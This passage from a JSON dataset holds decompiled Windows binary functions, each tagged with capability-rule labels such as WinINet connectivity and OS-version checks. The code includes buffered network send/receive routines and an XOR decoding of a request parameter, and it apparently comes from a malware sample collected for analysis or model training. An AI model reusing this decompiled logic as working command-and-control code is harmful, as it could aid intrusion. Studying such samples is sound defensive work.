uVar4 = fcn.00035eb0(iVar2 + 2, 0, 0);\n                                *arg_1ch = uVar4;\n                                goto code_r0x000475b9;\n                            }\n                        }\n                        if ((arg_20h != NULL) && (var_ach == 10)) {\n                            var_b0h = 0xb1c464ac;\n                            var_b4h = arg_8h + var_2ch;\n                            for (; 3 < var_ach; var_ach = var_ach - 4) {\n                                if (*var_b4h != *var_b0h) goto code_r0x0004785e;\n                                var_b0h = var_b0h + 1;\n                                var_b4h = var_b4h + 1;\n                            }\n                            if (var_ach == 0) {\ncode_r0x00047934:\n                                var_bch = 0;\n                            }\n                            else {\ncode_r0x0004785e:\n                                var_b8h = *var_b4h - *var_b0h;\n                                if (var_b8h == 0) {\n                                    if (var_ach == 1) goto code_r0x00047934;\n                                    var_b8h = *(var_b4h + 1) - *(var_b0h + 1);\n                                    if (var_b8h == 0) {\n                                        if (var_ach == 2) goto code_r0x00047934;\n                                        var_b8h = *(var_b4h + 2) - *(var_b0h + 2);\n                                        if (var_b8h == 0) {\n                                            if ((var_ach == 3) ||\n                                               (var_b8h = *(var_b4h + 3) - *(var_b0h + 3),  var_b8h == 0))\n                                            goto code_r0x00047934;\n                                        }\n                                    }\n                                }\n                                var_bch = 1;\n                                if (var_b8h < 1) {\n                                    var_bch = -1;\n                                }\n                            }\n                            if (var_bch == 0) {\n                                var_c8h = 0xb1be21c0;\n                                var_cch = iVar2 + 2;\n                                for (var_c4h = 5; 3 < var_c4h; var_c4h = var_c4h - 4) {\n                                    if (*var_cch != *var_c8h) goto code_r0x000479d5;\n                                    var_c8h = var_c8h + 1;\n                                    var_cch = var_cch + 1;\n                                }\n                                if (var_c4h == 0) {\ncode_r0x00047aab:\n                                    var_d4h = 0;\n                                }\n                                else {\ncode_r0x000479d5:\n                                    var_d0h = *var_cch - *var_c8h;\n                                    if (var_d0h == 0) {\n                                        if (var_c4h == 1) goto code_r0x00047aab;\n                                        var_d0h = *(var_cch + 1) - *(var_c8h + 1);\n                                        if (var_d0h == 0) {\n                                            if (var_c4h == 2) goto code_r0x00047aab;\n                                            var_d0h = *(var_cch + 2) - *(var_c8h + 2);\n                                            if (var_d0h == 0) {\n                                                if ((var_c4h == 3) ||\n                                                   (var_d0h = *(var_cch + 3) - *(var_c8h + 3),  var_d0h == 0))\n                                                goto code_r0x00047aab;\n                                            }\n                                        }\n                                    }\n                                    var_d4h = 1;\n                                    if (var_d0h < 1) {\n                                        var_d4h = -1;\n                                    }\n                                }\n                                if (var_d4h == 0) {\n                                    *arg_20h = 1;\n                                }\n                            }\n                        }\n                        goto code_r0x000475b9;\n                    }\n                }\ncode_r0x00047afd:\n                uVar4 = 1;\n            }\n        }\n        else {\n            uVar4 = 0;\n        }\n    }\n    else {\n        uVar4 = 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 4463
    },
    "00047b10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_684h\n// WARNING: Variable defined which should be unmapped: var_680h\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00047b10(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t var_684h;\n    int32_t var_680h;\n    uint var_5fch;\n    uint var_5f8h;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint *var_ch;\n    uint var_8h;\n    uint var_2h;\n    \n    var_14h = 0;\n    fcn.0007865e(&var_680h, 0xb1be21c8, *(arg_8h + 0x20), *(arg_8h + 0x21), *(arg_8h + 0x22), *(arg_8h + 0x23), \n                 *(arg_8h + 0x24));\n    var_ch = fcn.00035230(0xbd0);\n    if (var_ch != NULL) {\n        fcn.00078790(var_ch, 0, 0xbd0);\n        *var_ch = *(arg_8h + 0x10);\n        var_ch[1] = *(arg_8h + 0x14);\n        if (*(arg_8h + 0x610) < 0xbb9) {\n            var_ch[3] = 0;\n            var_ch[2] = *(arg_8h + 0x610) % 3000;\n            var_ch[4] = *(arg_8h + 0x610);\n            fcn.0007877e(var_ch + 5, arg_8h + 0x34, *(arg_8h + 0x610));\n            while( true ) {\n                var_684h = 0;\n                iVar1 = fcn.000489b0(&var_5f8h, &var_684h, var_ch);\n                if ((iVar1 == 0) ||\n                   (iVar1 = fcn.00046fd0(&var_5f8h, var_684h, &var_14h, &var_10h, &var_8h, &var_18h, var_ch + 0x2f3), \n                   iVar1 == 0)) break;\n                if ((var_2h & 1) != 0) {\n                    fcn.00048b50(&var_5f8h, var_684h, &var_680h, 1, 0);\n                }\n                var_680h = var_10h + -8;\n                var_684h = var_14h + 8;\n                iVar1 = fcn.0006c210(&var_8h, var_684h, var_680h, &var_680h, var_18h, var_ch);\n                if ((iVar1 != 0) || ((var_ch[0x2f3] & 1) != 0)) break;\n                fcn.00035330(var_14h);\n                var_14h = 0;\n            }\n        }\n    }\n    fcn.00035330(var_14h);\n    fcn.00035330(var_ch);\n    fcn.000529b0(*(arg_8h + 0x10), *(arg_8h + 0x14));\n    fcn.00052b30(arg_8h);\n    return 0;\n}\n",
        "token_count": 807
    },
    "00047d50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00047d50(int32_t arg_8h)\n\n{\n    char cVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    uint var_254h;\n    uint var_24ch;\n    uint *var_248h;\n    uint var_244h;\n    uint var_23ch;\n    uint *var_238h;\n    uint var_234h;\n    uint var_230h;\n    int32_t var_1ach;\n    int32_t var_1a8h;\n    uint *var_1a4h;\n    uint var_1a0h;\n    int32_t var_9ch;\n    uint var_98h;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    char *var_4h;\n    \n    var_1ach = arg_8h;\n    var_10h = 0;\n    var_1a4h = NULL;\n    fcn.0007865e(&var_230h, 0xb1be21c8, *(arg_8h + 0x20), *(arg_8h + 0x21), *(arg_8h + 0x22), *(arg_8h + 0x23), \n                 *(arg_8h + 0x24));\n    var_1a8h = var_1ach + 0x34;\n    iVar3 = *(var_1ach + 0x610);\n    fcn.00048b50(var_1a8h, iVar3, &var_230h, 0, &var_10h);\n    if (*(var_1ach + 0x18) == 6) {\n        fcn.0007865e(&var_98h, 0xb1be21d8, 0xd, 0xb1c58198);\n        var_238h = &var_98h;\n        do {\n            cVar1 = *var_238h;\n            var_238h = var_238h + 1;\n        } while (cVar1 != '\\0');\n        fcn.00052a50(*(var_1ach + 0x10), *(var_1ach + 0x14), &var_98h, var_238h - (&var_98h + 1));\n    }\n    else {\n        pcVar2 = fcn.000786fa(var_1a8h + 5, 0x3f, iVar3 + -5);\n        var_4h = pcVar2;\n        if (((pcVar2 != NULL) && (var_4h = pcVar2 + 0xb,  *var_4h == '&')) && (pcVar2[0xc] == 'a')) {\n            var_4h = pcVar2 + 0xd;\n            var_18h = fcn.000786fa(var_4h, 0x20, iVar3 - (var_4h - var_1a8h));\n            if ((var_18h != 0) && ((var_18h - var_4h) + 1U < 0x101)) {\n                var_9ch = fcn.000342e0(var_4h, &var_1a0h, var_18h - var_4h);\n                if (var_9ch != -1) {\n                    for (var_ch = 0; var_ch < var_9ch; var_ch = var_ch + 1) {\n                        *(&var_1a0h + var_ch) = *(&var_1a0h + var_ch) ^ *(var_ch + -0x4e3a82c8);\n                    }\n                    *(&var_1a0h + var_9ch) = 0;\n                    fcn.00076330(var_10h, &var_1a0h, var_9ch + 1, 0);\n                    iVar3 = fcn.000763f0(var_10h, &var_1a4h, &var_14h, 20000, 0);\n                    if (iVar3 == 0) {\n                        if (var_14h == 4) {\n                            var_8h = *var_1a4h;\n                            fcn.00076610(var_10h, var_1a4h);\n                            fcn.0007865e(&var_98h, 0xb1be2238, var_8h);\n                            var_248h = &var_98h;\n                            do {\n                                cVar1 = *var_248h;\n                                var_248h = var_248h + 1;\n                            } while (cVar1 != '\\0');\n                            iVar3 = fcn.00052a50(*(var_1ach + 0x10), *(var_1ach + 0x14), &var_98h, \n                                                 var_248h - (&var_98h + 1));\n                            if (iVar3 == 0) {\n                                while (iVar3 = fcn.000763f0(var_10h, &var_1a4h, &var_14h, 20000, 0),  iVar3 == 0) {\n                                    iVar3 = fcn.00052a50(*(var_1ach + 0x10), *(var_1ach + 0x14), var_1a4h, var_14h);\n                                    if (iVar3 != 0) goto code_r0x00048125;\n                                    fcn.00076610(var_10h, var_1a4h);\n                                }\n                                var_1a4h = NULL;\n                            }\n                        }\n                        else {\n                            fcn.00076610(var_10h, var_1a4h);\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x00048125:\n    fcn.00035330(var_1a4h);\n    fcn.00075d60(&var_10h, 0);\n    fcn.000529b0(*(var_1ach + 0x10), *(var_1ach + 0x14));\n    fcn.00052b30(var_1ach);\n    return 0;\n}\n",
        "token_count": 1383
    },
    "00048170": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.00048170(uint arg_8h, uint32_t arg_ch, int32_t *arg_10h, uint32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = arg_8h;\n    if (arg_ch == 0) {\n        *arg_10h = 0;\n        *arg_14h = 0;\n        var_ch = 0;\n    }\n    else {\n        iVar1 = fcn.00035200(arg_ch);\n        *arg_10h = iVar1;\n        if (*arg_10h == 0) {\n            var_ch = 0x21590004;\n        }\n        else {\n            *arg_14h = 0;\n            while (*arg_14h < arg_ch) {\n                var_8h = arg_ch - *arg_14h;\n                iVar1 = fcn.00048650(var_4h, *arg_10h + *arg_14h, var_8h, &var_8h, 0);\n                if (iVar1 == 0) {\n                    var_ch = -1;\n                    goto code_r0x0004822b;\n                }\n                if (var_8h == 0) {\n                    var_ch = -1;\n                    goto code_r0x0004822b;\n                }\n                *arg_14h = *arg_14h + var_8h;\n            }\n            var_ch = 0;\n        }\ncode_r0x0004822b:\n        if (var_ch != 0) {\n            fcn.00035330(*arg_10h);\n            *arg_10h = 0;\n            *arg_14h = 0;\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 455
    },
    "00048260": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00048260(uint *arg_8h, uint *arg_ch, uint *arg_10h, uint32_t arg_14h)\n\n{\n    char cVar1;\n    uchar uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint var_22ch;\n    uint var_224h;\n    uint *var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint32_t var_214h;\n    uint var_210h;\n    uint var_208h;\n    uint *var_8h;\n    uint *var_4h;\n    \n    var_8h = arg_8h;\n    if ((arg_14h == 0) && ((*(arg_ch + 6) & 2) != 0)) {\n        uVar3 = fcn.000785f8();\n        uVar3 = uVar3 & 0x8000001f;\n        if (uVar3 < 0) {\n            uVar3 = (uVar3 - 1 | 0xffffffe0) + 1;\n        }\n        arg_14h = uVar3 * 8;\n        arg_10h = &var_8h + uVar3 * -2;\n        var_4h = arg_10h;\n        for (var_214h = 0; var_214h < arg_14h; var_214h = var_214h + 1) {\n            uVar2 = fcn.000785f8();\n            *var_4h = uVar2;\n            var_4h = var_4h + 1;\n        }\n    }\n    if ((var_8h[0x2f3] & 1) == 0) {\n        var_21ch = 0xb1be229c;\n    }\n    else {\n        var_21ch = 0xb1be21c0;\n    }\n    fcn.0007865e(&var_210h, 0xb1be22a8, arg_14h + 8, var_21ch);\n    var_220h = &var_210h;\n    do {\n        cVar1 = *var_220h;\n        var_220h = var_220h + 1;\n    } while (cVar1 != '\\0');\n    var_214h = var_220h - (&var_210h + 1);\n    *(&var_210h + var_214h) = *arg_ch;\n    *(&stack0xfffffdf1 + var_214h + -1) = arg_ch[1];\n    fcn.00046f40(&var_210h + var_214h);\n    if ((arg_14h != 0) && (arg_14h < 0x208 - (var_214h + 8))) {\n        fcn.00078586(&var_208h + var_214h, arg_10h, arg_14h);\n        var_214h = var_214h + arg_14h;\n        arg_14h = 0;\n    }\n    iVar4 = fcn.00052a50(*var_8h, var_8h[1], &var_210h, var_214h + 8);\n    if ((iVar4 == 0) && ((arg_14h == 0 || (iVar4 = fcn.00052a50(*var_8h, var_8h[1], arg_10h, arg_14h),  iVar4 == 0)))) {\n        iVar4 = 0;\n    }\n    return iVar4;\n}\n",
        "token_count": 797
    },
    "000484a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000484a0(uint *arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint var_1a4h;\n    uint var_19ch;\n    uint *var_198h;\n    uint var_194h;\n    uint var_18ch;\n    uint *var_188h;\n    uint var_184h;\n    uint var_17ch;\n    uint *var_178h;\n    uint var_174h;\n    uint var_170h;\n    int32_t var_108h;\n    uint *var_104h;\n    uint var_100h;\n    \n    var_104h = arg_8h;\n    puVar3 = 0xb1be22e0;\n    puVar4 = &var_100h;\n    for (iVar2 = 0x12; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = *puVar3;\n    fcn.0007865e(&var_170h, 0xb1be232c, arg_ch);\n    var_178h = &var_170h;\n    do {\n        cVar1 = *var_178h;\n        var_178h = var_178h + 1;\n    } while (cVar1 != '\\0');\n    var_108h = var_178h - (&var_170h + 1);\n    puVar3 = &var_100h;\n    do {\n        var_188h = puVar3;\n        puVar3 = var_188h + 1;\n    } while (*var_188h != '\\0');\n    fcn.0007865e(var_188h, 0xb1be2340, var_108h);\n    var_198h = &var_100h;\n    do {\n        cVar1 = *var_198h;\n        var_198h = var_198h + 1;\n    } while (cVar1 != '\\0');\n    fcn.00052a50(*var_104h, var_104h[1], &var_100h, var_198h - (&var_100h + 1));\n    fcn.00052a50(*var_104h, var_104h[1], &var_170h, var_108h);\n    return;\n}\n",
        "token_count": 567
    },
    "00048650": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00048650(uint *arg_8h, int32_t arg_ch, uint32_t arg_10h, uint32_t *arg_14h, int32_t arg_18h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    if (arg_8h[4] == 0) {\n        if (arg_10h < 0xbb9) {\n            iVar2 = fcn.00052a90(*arg_8h, arg_8h[1], arg_8h + 5, 3000, &var_4h, 60000);\n            if ((iVar2 != 0) || (var_4h == 0)) {\n                return 0;\n            }\n            arg_8h[3] = 0;\n            arg_8h[2] = var_4h % 3000;\n            arg_8h[4] = var_4h;\n            if (var_4h < arg_10h) {\n                *arg_14h = var_4h;\n            }\n            else {\n                *arg_14h = arg_10h;\n            }\n            fcn.0007877e(arg_ch, arg_8h + 5, *arg_14h);\n            if (arg_18h == 0) {\n                arg_8h[3] = *arg_14h % 3000;\n                arg_8h[4] = arg_8h[4] - *arg_14h;\n            }\n        }\n        else {\n            if (arg_18h != 0) {\n                return 0;\n            }\n            iVar2 = fcn.00052a90(*arg_8h, arg_8h[1], arg_ch, arg_10h, arg_14h, 60000);\n            if ((iVar2 != 0) || (*arg_14h == 0)) {\n                return 0;\n            }\n        }\n    }\n    else {\n        if (arg_8h[4] <= arg_10h && arg_10h != arg_8h[4]) {\n            arg_10h = arg_8h[4];\n        }\n        if (arg_8h[3] < arg_8h[2]) {\n            fcn.0007877e(arg_ch, arg_8h + arg_8h[3] + 0x14, arg_10h);\n        }\n        else {\n            uVar1 = 3000 - arg_8h[3];\n            if (arg_10h < uVar1) {\n                fcn.0007877e(arg_ch, arg_8h + arg_8h[3] + 0x14, arg_10h);\n            }\n            else {\n                fcn.0007877e(arg_ch, arg_8h + arg_8h[3] + 0x14, uVar1);\n                fcn.0007877e(arg_ch + uVar1, arg_8h + 5, arg_10h - uVar1);\n            }\n        }\n        if (arg_18h == 0) {\n            arg_8h[3] = (arg_8h[3] + arg_10h) % 3000;\n            arg_8h[4] = arg_8h[4] - arg_10h;\n        }\n        *arg_14h = arg_10h;\n    }\n    return 1;\n}\n",
        "token_count": 780
    },
    "00048870": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00048870(uint *arg_8h)\n\n{\n    uint uVar1;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (arg_8h[4] == 3000) {\n        uVar1 = 0;\n    }\n    else {\n        if (arg_8h[4] == 0) {\n            arg_8h[4] = 0;\n            arg_8h[2] = 0;\n            arg_8h[3] = 0;\n            var_8h = fcn.00052a90(*arg_8h, arg_8h[1], arg_8h + 5, 3000, &var_4h, 60000);\n        }\n        else if (arg_8h[2] < arg_8h[3] || arg_8h[2] == arg_8h[3]) {\n            var_8h = fcn.00052a90(*arg_8h, arg_8h[1], arg_8h + arg_8h[2] + 0x14, arg_8h[3] - arg_8h[2], &var_4h, 60000);\n        }\n        else {\n            var_8h = fcn.00052a90(*arg_8h, arg_8h[1], arg_8h + arg_8h[2] + 0x14, 3000 - arg_8h[2], &var_4h, 60000);\n        }\n        if ((var_8h == 0) && (var_4h != 0)) {\n            arg_8h[2] = (arg_8h[2] + var_4h) % 3000;\n            arg_8h[4] = arg_8h[4] + var_4h;\n            uVar1 = 1;\n        }\n        else {\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 454
    },
    "000489b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.000489b0(int32_t arg_8h, uint32_t *arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    do {\n        iVar1 = fcn.00048650(arg_10h, arg_8h, 0x5dc, arg_ch, 1);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        if (*arg_ch < 5) {\n            return 0;\n        }\n        for (var_ch = 0;\n            (var_ch < *arg_ch &&\n            ((*(arg_8h + var_ch) == '\\n' || ((*(arg_8h + var_ch) == '\\r' && (*(arg_8h + var_ch + 1) == '\\n'))))));\n            var_ch = var_ch + 1) {\n        }\n        var_4h = 0;\n        for (; var_ch < *arg_ch; var_ch = var_ch + 1) {\n            if ((*(arg_8h + var_ch) == '\\r') && (var_ch = var_ch + 1,  *arg_ch <= var_ch)) {\n                return 0;\n            }\n            if (*(arg_8h + var_ch) == '\\n') {\n                uVar2 = var_ch + 1;\n                if (*arg_ch <= uVar2) {\n                    return 0;\n                }\n                if ((*(arg_8h + uVar2) == '\\r') && (uVar2 = var_ch + 2,  *arg_ch <= var_ch + 2)) {\n                    return 0;\n                }\n                var_ch = uVar2;\n                if (*(arg_8h + var_ch) == '\\n') {\n                    var_4h = 1;\n                    break;\n                }\n            }\n        }\n        if (var_4h != 0) {\n            *arg_ch = var_ch + 1;\n            iVar1 = fcn.00048650(arg_10h, arg_8h, *arg_ch, &var_8h, 0);\n            if (iVar1 == 0) {\n                return 0;\n            }\n            if (var_8h != *arg_ch) {\n                return 0;\n            }\n            return 1;\n        }\n        iVar1 = fcn.00048870(arg_10h);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    } while( true );\n}\n",
        "token_count": 582
    },
    "00048b50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00048b50(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, int32_t *arg_18h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint var_164h;\n    uint var_15ch;\n    uint *var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_148h;\n    uint *var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint *var_b8h;\n    uint *var_b4h;\n    int32_t var_b0h;\n    uint *var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_88h;\n    int32_t var_4h;\n    \n    var_140h = 0;\n    var_4h = 0;\n    fcn.0002bdf0(&var_88h, 0x80);\n    var_144h = &var_88h;\n    do {\n        cVar1 = *var_144h;\n        var_144h = var_144h + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = fcn.00075a40(&var_4h, 0xb1c581a8, 0, 0, &var_88h, var_144h - (&var_88h + 1), 2);\n    if ((iVar2 == 0) && (iVar2 = fcn.000760f0(var_4h, 0),  iVar2 == 0)) {\n        if (arg_14h == 0) {\n            var_154h = 0xb1bde7aa;\n        }\n        else {\n            var_154h = 0xb1be2358;\n        }\n        fcn.00020a20(&var_138h, 0x80, 0xb1be235c, var_154h);\n        fcn.00078790(&var_b8h, 0, 0x30);\n        var_b4h = &var_138h;\n        var_158h = &var_138h;\n        do {\n            cVar1 = *var_158h;\n            var_158h = var_158h + 1;\n        } while (cVar1 != '\\0');\n        var_b0h = var_158h - (&var_138h + 1);\n        var_b8h = &var_a8h;\n        var_a4h = arg_8h;\n        var_a0h = arg_ch;\n        var_a8h = &var_98h;\n        var_94h = 0xb1bde7aa;\n        var_90h = 1;\n        iVar2 = fcn.00076840(var_4h, &var_b8h, 0);\n        if (iVar2 == 0) {\n            if (arg_18h != NULL) {\n                *arg_18h = var_4h;\n                var_4h = 0;\n            }\n            var_140h = 1;\n        }\n    }\n    if (var_4h != 0) {\n        fcn.00075d60(&var_4h, 0);\n    }\n    return var_140h;\n}\n",
        "token_count": 768
    },
    "00048d70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t fcn.00048d70(void)\n\n{\n    char *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint var_18h;\n    uint var_10h;\n    char *var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00029090(0x2f1, 0xb1c5a680, 0x52, 0xb1c5b6f4);\n    if (var_4h == 0) {\n        iVar3 = fcn.00029090(0x2f2, 0xb1c5a628, 0x52, &var_8h);\n        if (iVar3 == 0) {\n            var_ch = 0xb1c5a680;\n            pcVar1 = var_ch;\n            do {\n                var_ch = pcVar1;\n                pcVar1 = var_ch + 1;\n            } while (*var_ch != '\\0');\n            *0xb1c5b6f4 = var_ch + 0x4e3a5980;\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = iVar3 + 0x191U | 0x21590000;\n        }\n    }\n    else {\n        uVar2 = var_4h + 0x191U | 0x21590000;\n    }\n    return uVar2;\n}\n",
        "token_count": 327
    },
    "00048e20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00048e20(int32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint var_64h;\n    uint var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    int32_t *var_54h;\n    int32_t *var_50h;\n    uint32_t var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t *var_3ch;\n    int32_t *var_38h;\n    uint32_t var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    uint32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    uint32_t var_4h;\n    \n    if (*0xb1c5b6f4 == 0) {\n        return 0;\n    }\n    if (arg_ch <= *0xb1c5b6f4 + 0x11) {\n        return 0;\n    }\n    var_8h = 0xb1be2364;\n    var_ch = arg_8h;\n    for (var_4h = 5; 3 < var_4h; var_4h = var_4h - 4) {\n        if (*var_ch != *var_8h) goto code_r0x00048e82;\n        var_8h = var_8h + 1;\n        var_ch = var_ch + 1;\n    }\n    if (var_4h == 0) {\ncode_r0x00048f04:\n        var_14h = 0;\n    }\n    else {\ncode_r0x00048e82:\n        var_10h = *var_ch - *var_8h;\n        if (var_10h == 0) {\n            if (var_4h == 1) goto code_r0x00048f04;\n            var_10h = *(var_ch + 1) - *(var_8h + 1);\n            if (var_10h == 0) {\n                if (var_4h == 2) goto code_r0x00048f04;\n                var_10h = *(var_ch + 2) - *(var_8h + 2);\n                if (var_10h == 0) {\n                    if ((var_4h == 3) || (var_10h = *(var_ch + 3) - *(var_8h + 3),  var_10h == 0))\n                    goto code_r0x00048f04;\n                }\n            }\n        }\n        var_14h = 1;\n        if (var_10h < 1) {\n            var_14h = -1;\n        }\n    }\n    if (var_14h == 0) {\n        var_20h = 0xb1c5a680;\n        var_24h = arg_8h + 1;\n        for (var_1ch = *0xb1c5b6f4; 3 < var_1ch; var_1ch = var_1ch - 4) {\n            if (*var_24h != *var_20h) goto code_r0x00048f74;\n            var_20h = var_20h + 1;\n            var_24h = var_24h + 1;\n        }\n        if (var_1ch == 0) {\ncode_r0x00048ff6:\n            var_2ch = 0;\n        }\n        else {\ncode_r0x00048f74:\n            var_28h = *var_24h - *var_20h;\n            if (var_28h == 0) {\n                if (var_1ch == 1) goto code_r0x00048ff6;\n                var_28h = *(var_24h + 1) - *(var_20h + 1);\n                if (var_28h == 0) {\n                    if (var_1ch == 2) goto code_r0x00048ff6;\n                    var_28h = *(var_24h + 2) - *(var_20h + 2);\n                    if (var_28h == 0) {\n                        if ((var_1ch == 3) || (var_28h = *(var_24h + 3) - *(var_20h + 3),  var_28h == 0))\n                        goto code_r0x00048ff6;\n                    }\n                }\n            }\n            var_2ch = 1;\n            if (var_28h < 1) {\n                var_2ch = -1;\n            }\n        }\n        if (var_2ch == 0) {\n            return 1;\n        }\n    }\n    var_38h = 0xb1be236c;\n    var_3ch = arg_8h;\n    for (var_34h = 6; 3 < var_34h; var_34h = var_34h - 4) {\n        if (*var_3ch != *var_38h) goto code_r0x00049061;\n        var_38h = var_38h + 1;\n        var_3ch = var_3ch + 1;\n    }\n    if (var_34h == 0) {\ncode_r0x000490e3:\n        var_44h = 0;\n    }\n    else {\ncode_r0x00049061:\n        var_40h = *var_3ch - *var_38h;\n        if (var_40h == 0) {\n            if (var_34h == 1) goto code_r0x000490e3;\n            var_40h = *(var_3ch + 1) - *(var_38h + 1);\n            if (var_40h == 0) {\n                if (var_34h == 2) goto code_r0x000490e3;\n                var_40h = *(var_3ch + 2) - *(var_38h + 2);\n                if (var_40h == 0) {\n                    if ((var_34h == 3) || (var_40h = *(var_3ch + 3) - *(var_38h + 3),  var_40h == 0))\n                    goto code_r0x000490e3;\n                }\n            }\n        }\n        var_44h = 1;\n        if (var_40h < 1) {\n            var_44h = -1;\n        }\n    }\n    if (var_44h != 0) {\n        return 0;\n    }\n    var_50h = 0xb1c5a680;\n    var_54h = arg_8h + 5;\n    for (var_4ch = *0xb1c5b6f4; 3 < var_4ch; var_4ch = var_4ch - 4) {\n        if (*var_54h != *var_50h) goto code_r0x00049153;\n        var_50h = var_50h + 1;\n        var_54h = var_54h + 1;\n    }\n    if (var_4ch == 0) {\ncode_r0x000491d5:\n        var_5ch = 0;\n    }\n    else {\ncode_r0x00049153:\n        var_58h = *var_54h - *var_50h;\n        if (var_58h == 